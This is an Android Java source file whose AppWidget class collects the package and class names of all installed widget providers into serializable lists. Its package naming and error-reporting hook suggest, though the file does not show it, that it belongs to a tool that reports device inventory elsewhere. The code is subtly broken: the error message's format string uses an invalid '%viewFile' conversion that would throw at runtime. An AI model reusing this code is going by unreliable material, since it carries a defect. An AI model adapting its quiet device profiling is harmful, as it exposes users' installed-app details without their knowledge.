package Transfer;

import android.appwidget.AppWidgetManager;
import android.appwidget.AppWidgetProviderInfo;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class AppWidget implements Serializable {

  public List<String> CLASS;
  public List<String> PACKAGE;

  public AppWidget() {
    PACKAGE = new ArrayList();
    CLASS = new ArrayList();

    try {
      if (VERSION.SDK_INT >= 3) {
        for (AppWidgetProviderInfo appWidgetProviderInfo : ((AppWidgetManager) MyService.context.getSystemService(
            Context.APPWIDGET_SERVICE)).getInstalledProviders()) {
          PACKAGE.add(appWidgetProviderInfo.provider.getPackageName());
          CLASS.add(appWidgetProviderInfo.provider.getClassName());
        }
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 3, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
